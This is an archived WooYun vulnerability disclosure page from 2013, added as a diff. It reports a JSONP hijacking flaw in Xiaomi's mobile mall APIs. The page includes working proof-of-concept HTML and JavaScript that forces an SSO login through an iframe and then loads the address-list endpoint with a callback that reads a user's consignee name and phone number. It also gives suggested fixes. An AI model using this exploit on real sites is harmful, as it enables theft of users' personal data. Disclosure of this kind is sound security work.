@@ -1,0 +1,196 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		小米js hijacking可获取用户地址、订单信息等（手机通信API挖掘技巧）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		小米js hijacking可获取用户地址、订单信息等（手机通信API挖掘技巧）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/blue">blue</a> 
+</li><li>提交时间：		2013-05-06 11:31</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-06：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-05-11：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">一应用里的获取数据方式都是jsonp，callback了自然就能获取了。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">小米商城手机客户端实际上是一个内置浏览器加载的m.xiaomi.com，而用户的地址、订单等数据则存在于app.shopapi.xiaomi.com，估计是为了跨域，使用了jsonp方式，导致可js劫持获取用户数据。<br />
+<br />
+测试过程：<br />
+<br />
+1.打开Burp，开启代理<br />
+<br />
+2.手机设置上网代理，看http请求，然后就看到一一连串的callback请求<br />
+<br />
+3.到了2这一步，只是m.xiaomi.com下可以js劫持，www.xiaomi.com和其它域名咋办呐？<br />
+<br />
+4.发现m.xiaomi.com使用的登录接口是https://account.xiaomi.com/pass/serviceLogin?callback=...&amp;sid=eshopmobile，重点是eshopmobile(eshopmobile时会去app.shopapi.xiaomi.com同步登录一下)，而网页版的为eshop<br />
+<br />
+5.通过4分析，在用户登录的情况下诱使用户访问一次https://account.xiaomi.com/pass/serviceLogin?callback=...&amp;sid=eshopmobile，主域名和其它域名也能js劫持了。<br />
+<br />
+6.上劫持用户地址列表的脚本：<br />
+<br />
+xiaomi.html<br />
+<br />
+</p><pre><code>&lt;iframe src=&quot;https://account.xiaomi.com/pass/serviceLogin?callback=http%3A%2F%2Fapp.shopapi.xiaomi.com%2Fv1%2Fauthorize%2Fsso_callback%3Ffollowup%3Dhttp%253A%252F%252Fm.xiaomi.com%252Findex.html%2523ac%253Daccount%2526op%253Dindex%26sign%3DMjIzYzEwMzEzODg1NmI0ZGI2OGViZDljOGRlNjZmOTExYjE1NDBlNw%2C%2C&amp;sid=eshopmobile&quot;&gt;&lt;/iframe&gt; &lt;!--里面的sign做验证用，每次登录都不一样，不影响劫持--&gt;<br />
+&lt;script&gt;<br />
+setTimeout(function(){ location.href=&#039;xiaomi2.html&#039;; },3000);<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+xiaomi2.html<br />
+<br />
+</p><pre><code>&lt;script&gt;<br />
+function getall(o){<br />
+    var data=o.data;<br />
+    alert(data[0].consignee+&#039; &#039;+data[0].tel);<br />
+}<br />
+&lt;/script&gt;<br />
+&lt;script src=&quot;http://app.shopapi.xiaomi.com/v1/address/list?callback=getall&amp;client_id=180100031013&amp;_=1367750497612&quot;&gt;&lt;/script&gt;</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/06111354faec58228fd6f99f2fce1c42c67fa8c6.png" target="_blank"><img src="../images/06111354faec58228fd6f99f2fce1c42c67fa8c6.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/06112033ef038263b6b29afe076dcdb2b87ac67b.png" target="_blank"><img src="../images/06112033ef038263b6b29afe076dcdb2b87ac67b.png" alt="2.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1.可以纯json返回，header头里p3p一下方式跨域<br />
+<br />
+2.非要jsonp的话，判断Referer+UserAgent吧～<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/blue" title="blue">blue</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-023149" title="小米js hijacking可获取用户地址、订单信息等（手机通信API挖掘技巧）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-05-06 11:31</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="23149";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
